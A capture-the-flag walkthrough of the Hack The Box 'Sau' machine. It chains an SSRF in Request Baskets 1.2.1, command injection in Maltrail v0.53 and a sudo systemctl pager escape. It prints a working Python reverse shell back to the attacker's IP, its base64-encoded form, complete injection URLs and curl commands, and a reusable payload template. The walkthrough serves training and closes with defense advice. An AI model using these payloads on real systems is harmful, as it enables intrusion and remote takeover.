# HTB - Seu - 10.10.11.224

## HTB - Sau

### Machine Info

* **Difficulty:** Easy
* **OS:** Linux (Ubuntu)
* **IP:** 10.10.11.224
* **Key Skills:** SSRF exploitation, Request Baskets CVE, Maltrail RCE, systemctl privilege escalation

### Overview

Sau is a straightforward Linux box that teaches SSRF (Server-Side Request Forgery) and service exploitation. The machine runs Request Baskets on port 55555, which has an SSRF vulnerability that lets us access an internal Maltrail service on port 80. Maltrail has an unauthenticated RCE vulnerability that we exploit to get initial access. Privilege escalation is simple - the user can run `systemctl status` with sudo, which drops us into a pager that allows shell escape.

**Key Concepts:**

* Server-Side Request Forgery (SSRF)
* Request Baskets vulnerability (CVE-2023-27163)
* Maltrail unauthenticated RCE
* systemctl/less pager escape
* Base64 payload encoding

**Common Ports:**

* **22/TCP** - SSH (OpenSSH 8.2p1)
* **80/TCP** - HTTP (Filtered - internal only)
* **55555/TCP** - Request Baskets web service

***

### Exploitation Workflow Summary

1. **Initial Enumeration** ├─ Nmap reveals SSH, filtered HTTP, and port 55555 ├─ Identify Request Baskets service on 55555 └─ Discover version 1.2.1
2. **SSRF Exploitation** ├─ Create new basket in Request Baskets ├─ Configure forward URL to localhost:80 ├─ Access internal Maltrail service └─ Identify Maltrail v0.53
3. **Remote Code Execution** ├─ Find Maltrail RCE vulnerability ├─ Craft command injection payload ├─ Encode reverse shell in base64 ├─ Execute via SSRF + RCE chain └─ Gain shell as puma user
4. **Privilege Escalation** ├─ Check sudo permissions ├─ Exploit systemctl status command ├─ Escape from less pager └─ Gain root shell

***

### Initial Enumeration

#### Port Scanning

Let's see what we're working with:

```bash
sudo nmap -Pn -p- -sCV -T5 10.10.11.224 -oN nmap.tcp
```

**Key findings:**

```
PORT      STATE    SERVICE
22/tcp    open     ssh        OpenSSH 8.2p1 Ubuntu
80/tcp    filtered http       (No response - internal only)
55555/tcp open     unknown    (HTTP service)
```

**What stands out:**

* Port 80 is **filtered** - accessible only from localhost
* Port 55555 running an HTTP service
* Standard SSH on 22

#### Service Identification

**Checking port 55555:**

```bash
curl http://10.10.11.224:55555
```

**Response:**

```
HTTP/1.0 302 Found
Location: /web
```

**Accessing /web:**

```
http://10.10.11.224:55555/web
```

**Discovered:** Request Baskets service!

**What is Request Baskets?** A web service that collects arbitrary HTTP requests and lets you inspect them via a web UI or API. It's used for testing webhooks and HTTP integrations.

***

### Request Baskets SSRF

#### Understanding the Application

**Key features we notice:**

* Create custom "baskets" to collect requests
* Each basket has a unique token for authentication
* Configuration options include request forwarding
* Version visible: **Request Baskets 1.2.1**

#### Finding the Vulnerability

**Testing basket name validation:**

```bash
curl http://10.10.11.224:55555/web/'
```

**Error response:**

```
invalid basket name; the name does not match pattern: ^[\w\d\-_\.]{1,250}$
```

This tells us the allowed characters for basket names.

**Searching for vulnerabilities:**

* Request Baskets 1.2.1 is vulnerable to **CVE-2023-27163**
* Server-Side Request Forgery (SSRF) vulnerability
* Allows accessing internal services via the forward feature

#### What is SSRF?

**Server-Side Request Forgery explained:**

When an application makes HTTP requests on behalf of users, but doesn't properly validate the target URL. Attackers can:

* Access internal services (like port 80 on this machine)
* Bypass firewalls and access controls
* Read internal files or metadata

**Why it matters here:** Port 80 is filtered externally but accessible from localhost. Request Baskets can forward our requests to it.

#### Exploiting the SSRF

**Step 1: Create a basket**

Visit: `http://10.10.11.224:55555/web`

Click "Create" and give it a name (e.g., "exploit")

**You'll receive:**

* Basket URL: `http://10.10.11.224:55555/exploit`
* Token: Random authentication token (e.g., `mubxsb`)

**Step 2: Configure forwarding**

Access basket settings:

```
http://10.10.11.224:55555/web/exploit
```

Enter your token when prompted.

**Configure these settings:**

* **Forward URL:** `http://127.0.0.1:80`
* **Proxy Response:** ✓ (Enabled)
* **Expand Forward Path:** ✓ (Enabled)
* **Insecure TLS:** ✓ (If needed)

**What this does:**

* Requests to our basket URL get forwarded to localhost:80
* Response is proxied back to us
* We can now access the internal service on port 80

**Step 3: Access internal service**

```
http://10.10.11.224:55555/exploit
```

**Result:** We can now see the internal web service!

**Discovered:** Maltrail v0.53 running on port 80

***

### Maltrail RCE Exploitation

#### What is Maltrail?

Maltrail is a malicious traffic detection system that monitors network traffic for suspicious activity. Version 0.53 has a known vulnerability.

#### The Vulnerability

**Maltrail v0.53 - Unauthenticated RCE:**

* CVE: Not formally assigned but well-documented
* Location: `/login` endpoint
* Parameter: `username` field
* Type: Command injection

**How it works:** The `username` parameter is passed to a shell command without sanitization, allowing command injection.

#### Crafting the Payload

**Step 1: Create reverse shell**

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

**Step 2: Encode in base64**

```bash
echo 'python3 -c '"'"'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"'"'' | base64 -w0
```

**Result:**

```
cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuNyIsMTIzNCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9zaCIpJw==
```

**Step 3: Build injection payload**

```bash
echo "BASE64_PAYLOAD" | base64 -d | sh
```

**URL-encoded for the username parameter:**

```
`echo+"BASE64"+|+base64+-d+|+sh`
```

#### Exploitation Steps

**Setup listener:**

```bash
nc -lvnp 1234
```

**Construct the exploit URL:**

```
http://10.10.11.224:55555/BASKET_NAME/login?username=`echo+"cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuNyIsMTIzNCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9zaCIpJw=="+|+base64+-d+|+sh`
```

**Full example with basket "exploit":**

```
http://10.10.11.224:55555/exploit/login?username=`echo+"cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuNyIsMTIzNCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9zaCIpJw=="+|+base64+-d+|+sh`
```

**Execute:**

```bash
curl "http://10.10.11.224:55555/exploit/login?username=\`echo+\"cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuNyIsMTIzNCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9zaCIpJw==\"+|+base64+-d+|+sh\`"
```

**Shell received!**

```bash
$ id
uid=1001(puma) gid=1001(puma) groups=1001(puma)

$ whoami
puma
```

#### User Flag

```bash
cat /home/puma/user.txt
```

***

### Privilege Escalation - systemctl Exploit

#### Enumeration

**Check sudo permissions:**

```bash
sudo -l
```

**Output:**

```
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

**What this means:**

* We can run `systemctl status trail.service` as root
* No password required
* `systemctl status` uses a pager (typically `less`) to display output

#### Understanding the Exploit

**How pagers work:** When output is longer than the terminal height, commands like `systemctl status` use a pager (usually `less`) to display content page by page.

**The vulnerability:** `less` (and similar pagers) allow executing shell commands while viewing content. If the pager runs as root, our commands also run as root.

#### Exploitation

**Step 1: Run the command**

```bash
sudo /usr/bin/systemctl status trail.service
```

**What happens:** The status output opens in `less` pager running as root.

**Step 2: Execute shell escape**

While in the pager, type:

```
!sh
```

**What this does:**

* `!` in `less` allows executing shell commands
* `sh` spawns a shell
* Since `less` is running as root, we get a root shell

**Alternative commands:**

```
!/bin/bash
!/bin/sh
!bash
```

**Result:**

```bash
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)
```

**We're root!**

#### Root Flag

```bash
cat /root/root.txt
44405b0857d05daba16e752e5cd0da3c
```

***

### Quick Reference

#### Request Baskets SSRF

```bash
# Create basket via web interface
# Configure settings:
Forward URL: http://127.0.0.1:80
Proxy Response: Enabled
Expand Forward Path: Enabled

# Access internal service
http://TARGET:55555/BASKET_NAME/
```

#### Maltrail RCE Payload

```bash
# Generate base64 reverse shell
echo 'python3 -c '"'"'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"'"'' | base64 -w0

# Exploit URL format
http://TARGET:55555/BASKET/login?username=`echo+"BASE64_PAYLOAD"+|+base64+-d+|+sh`

# Setup listener
nc -lvnp PORT
```

#### systemctl Privilege Escalation

```bash
# Check sudo permissions
sudo -l

# Run privileged systemctl
sudo /usr/bin/systemctl status SERVICE_NAME

# In the pager, execute shell escape
!sh

# Alternative escapes
!/bin/bash
!bash
```

#### Common Pager Escapes

```bash
# In less
!sh            # Spawn shell
!/bin/bash     # Spawn bash
v              # Open editor (may allow shell)

# In more
!sh            # Spawn shell

# In man
!sh            # Spawn shell
```

***

### Troubleshooting

#### SSRF Not Working

**Problem:** Can't access internal service via basket

**Solution:**

* Ensure "Proxy Response" is enabled
* Check "Expand Forward Path" is enabled
* Try different basket names (alphanumeric, dashes, underscores)
* Verify forward URL is exactly `http://127.0.0.1:80`

**Why it works:** These settings tell Request Baskets to forward requests and return responses.

#### Maltrail RCE Payload Fails

**Problem:** Shell not received after sending payload

**Solution:**

```bash
# Verify base64 encoding
echo "PAYLOAD" | base64 -d
# Should output your Python command

# Test simpler payload first
curl "http://TARGET:55555/BASKET/login?username=\`whoami\`"

# Check for URL encoding issues
# Use burp suite to verify exact request

# Ensure listener is running
nc -lvnp PORT
```

**Why it works:** Base64 avoids issues with special characters in URLs.

#### systemctl Pager Not Appearing

**Problem:** `systemctl status` doesn't open a pager

**Solution:**

```bash
# Make your terminal smaller
# Pager only appears if output is longer than terminal

# Or force pager
sudo PAGER=less /usr/bin/systemctl status trail.service

# Alternative: Use --no-pager=false
sudo /usr/bin/systemctl --no-pager=false status trail.service
```

**Why it works:** Pagers only activate when output exceeds terminal size.

#### Shell Escape Not Working

**Problem:** `!sh` doesn't give shell in pager

**Solution:**

```bash
# Try different escape sequences
!bash
!/bin/sh
!/bin/bash

# If using vim from less
:!/bin/bash

# Check if SHELL variable is set
!echo $SHELL
```

**Why it works:** Different pagers and configurations may require different syntax.

***

### Key Takeaways

**What we learned:**

1. **SSRF vulnerabilities** - Services that forward HTTP requests can be abused to access internal services that are otherwise unreachable
2. **Port filtering** - Just because a port is filtered doesn't mean it's secure; internal services can be vulnerable
3. **Command injection** - Always sanitize user input before passing it to shell commands; base64 encoding can bypass filters
4. **Pager escapes** - Commands that run with elevated privileges and use pagers (`less`, `more`) are potential privilege escalation vectors
5. **Chaining vulnerabilities** - We combined SSRF → RCE → Pager escape to go from external access to root

**Defense recommendations:**

* Validate and sanitize all URLs in forwarding/proxy features
* Implement whitelist of allowed internal IPs/ports
* Don't allow forwarding to localhost/127.0.0.1
* Sanitize all user input before shell execution
* Avoid running pagers with sudo/elevated privileges
* Use `--no-pager` flag in systemctl when running with sudo
* Restrict sudo permissions to specific command arguments
* Keep software updated (Request Baskets, Maltrail had known vulns)

***

### Related Topics

* \[\[Server-Side Request Forgery]]
* \[\[Command Injection]]
* \[\[Privilege Escalation via Sudo]]
* \[\[Pager Escapes]][Troubleshooting](https://app.gitbook.com/o/Zz9PoXy7MKWPr6PFjGAV/s/FV5M0WmCra6ixk8mk0BI/~/edit/~/changes/16/challenges/htb/htb-seu-10.10.11.224#troubleshooting)
* \[\[Base64 Encoding for Exploits]]
* \[\[Linux Privilege Escalation]]

***

